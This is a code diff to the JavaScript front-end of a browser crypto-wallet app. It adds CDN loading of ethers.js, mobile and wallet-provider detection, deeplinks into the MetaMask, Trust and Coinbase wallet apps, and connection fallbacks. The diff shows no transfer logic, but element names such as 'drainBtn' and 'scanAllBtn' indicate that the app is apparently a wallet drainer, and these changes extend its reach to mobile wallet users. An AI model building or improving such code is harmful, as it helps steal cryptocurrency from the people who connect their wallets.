@@ -1,4 +1,14 @@
-import { ethers } from "ethers";
+// First, let's check if ethers is available
+if (typeof ethers === 'undefined') {
+    console.error("❌ ethers.js is not loaded!");
+    // Load ethers from CDN if not available
+    const script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js';
+    script.onload = initializeApp;
+    document.head.appendChild(script);
+} else {
+    document.addEventListener('DOMContentLoaded', initializeApp);
+}
 
 // Configuration
 const CONFIG = {
@@ -41,16 +51,10 @@ let walletProvider = null;
 // DOM Elements
 let connectBtn, statusEl, tokensEl, tokensContainer, drainBtn, scanAllBtn, chainSelector, networkSelect, tokenCount;
 
-// Initialize when page loads
-document.addEventListener('DOMContentLoaded', async () => {
-    console.log('✅ DOM loaded, initializing app...');
-    await initializeApp();
-});
-
 async function initializeApp() {
+    console.log('🔄 Initializing app...');
+    
     try {
-        console.log('🔄 Initializing app...');
-        
         // Get DOM elements
         connectBtn = document.getElementById("connectBtn");
         statusEl = document.getElementById("status");
@@ -150,6 +154,34 @@ function populateNetworkOptions() {
     });
 }
 
+// Mobile wallet detection - CRITICAL FOR MOBILE
+function isMobileDevice() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+}
+
+function getMobileWalletLinks() {
+    if (isMobileDevice()) {
+        const userAgent = navigator.userAgent.toLowerCase();
+        
+        if (userAgent.includes('iphone') || userAgent.includes('ipad')) {
+            // iOS
+            return {
+                metamask: 'https://metamask.app.link/dapp/' + window.location.hostname,
+                trust: 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(window.location.href),
+                coinbase: 'https://go.cb-w.com/dapp?cb_url=' + encodeURIComponent(window.location.href)
+            };
+        } else {
+            // Android
+            return {
+                metamask: 'https://metamask.app.link/dapp/' + window.location.hostname + window.location.pathname,
+                trust: 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(window.location.href),
+                coinbase: 'https://go.cb-w.com/dapp?cb_url=' + encodeURIComponent(window.location.href)
+            };
+        }
+    }
+    return null;
+}
+
 async function checkExistingConnection() {
     try {
         // Try multiple ways to detect wallet
@@ -184,46 +216,43 @@ async function checkExistingConnection() {
 }
 
 async function detectWalletProvider() {
-    // Try multiple wallet detection methods
     console.log("🔄 Detecting wallet provider...");
     
-    // 1. Standard EIP-1193 provider (MetaMask, Brave, etc.)
-    if (typeof window.ethereum !== 'undefined') {
-        console.log("✅ Detected EIP-1193 provider (MetaMask/Brave/Coinbase)");
-        return window.ethereum;
+    // Check if we're on mobile
+    if (isMobileDevice()) {
+        console.log("📱 Mobile device detected");
+        
+        // On mobile, we need to check for injected providers differently
+        // Many mobile wallets inject their provider when the dapp is opened via deeplink
+        
+        // Wait a moment for mobile wallets to inject
+        await new Promise(resolve => setTimeout(resolve, 500));
     }
     
-    // 2. Legacy providers
-    if (typeof window.web3 !== 'undefined' && window.web3.currentProvider) {
-        console.log("✅ Detected legacy web3 provider");
-        return window.web3.currentProvider;
-    }
+    // List of wallet providers to check (in order of priority)
+    const providersToCheck = [
+        { name: 'ethereum', check: () => window.ethereum },
+        { name: 'web3', check: () => window.web3?.currentProvider },
+        { name: 'coinbase', check: () => window.coinbaseWalletExtension },
+        { name: 'trust', check: () => window.trustwallet },
+        { name: 'binance', check: () => window.BinanceChain },
+        { name: 'phantom', check: () => window.phantom?.ethereum },
+        { name: 'brave', check: () => window.ethereum?.isBraveWallet ? window.ethereum : null }
+    ];
     
-    // 3. Coinbase Wallet
-    if (window.coinbaseWalletExtension) {
-        console.log("✅ Detected Coinbase Wallet");
-        return window.coinbaseWalletExtension;
-    }
-    
-    // 4. Trust Wallet
-    if (window.trustwallet) {
-        console.log("✅ Detected Trust Wallet");
-        return window.trustwallet;
-    }
-    
-    // 5. Binance Chain Wallet
-    if (window.BinanceChain) {
-        console.log("✅ Detected Binance Chain Wallet");
-        return window.BinanceChain;
-    }
-    
-    // 6. Check for injected providers via EIP-6963
-    if (typeof window !== 'undefined') {
-        const providers = await detectEIP6963Providers();
-        if (providers.length > 0) {
-            console.log(`✅ Detected ${providers.length} EIP-6963 provider(s)`);
-            return providers[0].provider; // Use first detected provider
+    for (const providerInfo of providersToCheck) {
+        const provider = providerInfo.check();
+        if (provider) {
+            console.log(`✅ Detected ${providerInfo.name} wallet`);
+            return provider;
         }
+    }
+    
+    // Check for EIP-6963 providers
+    const eip6963Providers = await detectEIP6963Providers();
+    if (eip6963Providers.length > 0) {
+        console.log(`✅ Detected ${eip6963Providers.length} EIP-6963 provider(s)`);
+        return eip6963Providers[0].provider;
     }
     
     console.log("❌ No wallet provider detected");
@@ -235,16 +264,21 @@ async function detectEIP6963Providers() {
         const providers = [];
         
         // Listen for EIP-6963 events
-        window.addEventListener('eip6963:announceProvider', (event) => {
+        const handleProviderAnnouncement = (event) => {
             console.log("🔄 EIP-6963 provider detected:", event.detail.info.name);
             providers.push(event.detail);
-        });
+        };
+        
+        window.addEventListener('eip6963:announceProvider', handleProviderAnnouncement);
         
         // Request provider announcements
         window.dispatchEvent(new Event('eip6963:requestProvider'));
         
-        // Wait a bit for responses
-        setTimeout(() => resolve(providers), 100);
+        // Wait for responses
+        setTimeout(() => {
+            window.removeEventListener('eip6963:announceProvider', handleProviderAnnouncement);
+            resolve(providers);
+        }, 300);
     });
 }
 
@@ -259,6 +293,12 @@ async function handleConnect() {
         }
         
         updateStatus("🔄 Connecting wallet...");
+        
+        // On mobile, we might need to guide users to open in wallet app
+        if (isMobileDevice() && !window.ethereum) {
+            showMobileWalletGuide();
+            return;
+        }
         
         // Detect wallet provider
         const detectedProvider = await detectWalletProvider();
@@ -288,23 +328,62 @@ async function handleConnect() {
     }
 }
 
+function showMobileWalletGuide() {
+    const mobileLinks = getMobileWalletLinks();
+    
+    let guideHTML = `
+        <div style="margin: 10px 0; padding: 15px; background: #fff3cd; border-radius: 8px; border: 1px solid #ffc107;">
+            <h4 style="margin-top: 0; color: #856404;">📱 Mobile Wallet Detected</h4>
+            <p>For best experience, open this dapp in your wallet browser:</p>
+            <div style="display: flex; flex-direction: column; gap: 10px; margin: 15px 0;">
+    `;
+    
+    if (mobileLinks) {
+        guideHTML += `
+            <a href="${mobileLinks.metamask}" 
+               style="padding: 12px; background: #f6851b; color: white; border-radius: 5px; text-decoration: none; text-align: center;">
+                Open in MetaMask
+            </a>
+            <a href="${mobileLinks.trust}" 
+               style="padding: 12px; background: #3375bb; color: white; border-radius: 5px; text-decoration: none; text-align: center;">
+                Open in Trust Wallet
+            </a>
+            <a href="${mobileLinks.coinbase}" 
+               style="padding: 12px; background: #0052ff; color: white; border-radius: 5px; text-decoration: none; text-align: center;">
+                Open in Coinbase Wallet
+            </a>
+        `;
+    }
+    
+    guideHTML += `
+            </div>
+            <p><small>Or tap "Connect Wallet" again after opening in your wallet browser.</small></p>
+        </div>
+    `;
+    
+    if (statusEl) {
+        statusEl.innerHTML = guideHTML;
+    }
+}
+
 async function requestWalletConnection(provider) {
     try {
         console.log("🔄 Requesting wallet connection...");
         
-        // Different providers may have different methods
         let accounts;
         
-        if (typeof provider.request !== 'undefined') {
-            // Modern EIP-1193 providers
+        // Modern EIP-1193 providers
+        if (typeof provider.request === 'function') {
             accounts = await provider.request({ 
                 method: 'eth_requestAccounts' 
             });
-        } else if (typeof provider.enable !== 'undefined') {
-            // Legacy providers
+        }
+        // Legacy providers
+        else if (typeof provider.enable === 'function') {
             accounts = await provider.enable();
-        } else if (provider.sendAsync) {
-            // Very old providers
+        }
+        // Very old providers
+        else if (typeof provider.sendAsync === 'function') {
             accounts = await new Promise((resolve, reject) => {
                 provider.sendAsync(
                     { method: 'eth_requestAccounts' },
@@ -314,7 +393,17 @@ async function requestWalletConnection(provider) {
                     }
                 );
             });
-        } else {
+        }
+        // If none of the above, try to get accounts directly
+        else if (typeof provider.send === 'function') {
+            accounts = await new Promise((resolve, reject) => {
+                provider.send({ method: 'eth_accounts' }, (error, response) => {
+                    if (error) reject(error);
+                    else resolve(response.result);
+                });
+            });
+        }
+        else {
             throw new Error("Wallet provider doesn't support connection requests");
         }
         
@@ -324,7 +413,7 @@ async function requestWalletConnection(provider) {
         
         // Get current chain
         let chainId;
-        if (typeof provider.request !== 'undefined') {
+        if (typeof provider.request === 'function') {
             const chainIdHex = await provider.request({ method: 'eth_chainId' });
             chainId = parseInt(chainIdHex, 16);
         } else {
@@ -366,16 +455,29 @@ async function handleConnected(account, chainId, provider) {
         isConnected = true;
         walletProvider = provider;
         
-        // Setup provider and signer
+        // SAFELY setup provider and signer
         try {
+            // Check if ethers is available
+            if (typeof ethers === 'undefined') {
+                throw new Error("ethers.js not loaded");
+            }
+            
+            // Create provider
             provider = new ethers.providers.Web3Provider(walletProvider);
             signer = provider.getSigner();
             console.log("✅ Provider and signer setup successfully");
         } catch (providerError) {
             console.error("❌ Provider setup error:", providerError);
-            // Try fallback RPC provider for read-only operations
-            provider = new ethers.providers.JsonRpcProvider(CONFIG.rpcProviders[chainId] || CONFIG.rpcProviders[1]);
-            console.log("⚠️ Using fallback RPC provider (read-only)");
+            
+            // Fallback: Use RPC provider for read-only
+            try {
+                const rpcUrl = CONFIG.rpcProviders[chainId] || CONFIG.rpcProviders[1];
+                provider = new ethers.providers.JsonRpcProvider(rpcUrl);
+                console.log("⚠️ Using fallback RPC provider (read-only)");
+            } catch (rpcError) {
+                console.error("❌ RPC provider also failed:", rpcError);
+                updateStatus("⚠️ Limited functionality - wallet connected but provider setup failed");
+            }
         }
         
         // Update UI
@@ -466,24 +568,6 @@ function setupWalletEventListeners(provider) {
             });
         }
         
-        // Legacy event listeners for older providers
-        if (typeof window.ethereum !== 'undefined') {
-            // Also set up window.ethereum listeners as backup
-            window.ethereum.on('accountsChanged', (accounts) => {
-                if (accounts.length === 0) {
-                    handleDisconnected();
-                }
-            });
-            
-            window.ethereum.on('chainChanged', (chainIdHex) => {
-                const chainId = parseInt(chainIdHex, 16);
-                currentChainId = chainId;
-                if (networkSelect) {
-                    networkSelect.value = chainId;
-                }
-            });
-        }
-        
     } catch (error) {
         console.log("⚠️ Error setting up wallet event listeners:", error.message);
     }
@@ -505,7 +589,7 @@ async function handleDisconnect() {
         }
         
         // Also try legacy disconnect methods
-        if (window.ethereum && window.ethereum.disconnect) {
+        if (window.ethereum && typeof window.ethereum.disconnect === 'function') {
             try {
                 await window.ethereum.disconnect();
             } catch (error) {
@@ -986,7 +1070,7 @@ function showWalletOptions() {
     
     if (statusEl) {
         // Append to existing status
-        statusEl.innerHTML = statusEl.innerHTML + walletOptions;
+        statusEl.innerHTML = walletOptions;
     }
 }
 
@@ -1016,9 +1100,10 @@ function updateStatus(message) {
 
 // Debug info and helper functions
 console.log("=== App Debug Info ===");
-console.log("Ethers version:", ethers.version);
+console.log("Ethers available:", typeof ethers !== 'undefined');
 console.log("Window.ethereum:", typeof window.ethereum !== 'undefined');
 console.log("Window.web3:", typeof window.web3 !== 'undefined');
+console.log("Is Mobile:", isMobileDevice());
 console.log("Navigator.userAgent:", navigator.userAgent);
 console.log("======================");
 
